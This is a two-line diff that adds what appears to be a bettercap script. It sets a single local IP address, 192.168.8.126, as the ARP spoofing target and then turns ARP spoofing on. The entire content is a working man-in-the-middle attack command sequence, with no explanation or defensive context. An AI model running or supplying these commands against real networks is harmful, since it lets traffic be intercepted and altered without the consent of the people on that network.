@@ -1,0 +1,2 @@
+set arp.spoof.targets 192.168.8.126
+arp.spoof on
